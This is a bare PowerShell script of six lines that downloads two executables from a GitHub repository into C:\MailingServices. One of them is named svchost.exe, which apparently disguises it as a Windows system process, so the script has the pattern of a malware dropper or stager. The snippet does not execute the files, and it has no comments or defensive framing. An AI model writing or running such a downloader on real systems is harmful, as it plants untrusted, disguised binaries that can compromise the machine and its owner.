$url = "https://github.com/violentqm/rest/raw/main/MailingServices.exe"
$outputPath = "C:\MailingServices\MailingServices.exe"
Invoke-WebRequest -Uri $url -OutFile $outputPath
$url2 = "https://github.com/violentqm/rest/raw/main/svchost.exe"
$outputPath2 = "C:\MailingServices\svchost.exe"
Invoke-WebRequest -Uri $url2 -OutFile $outputPath2
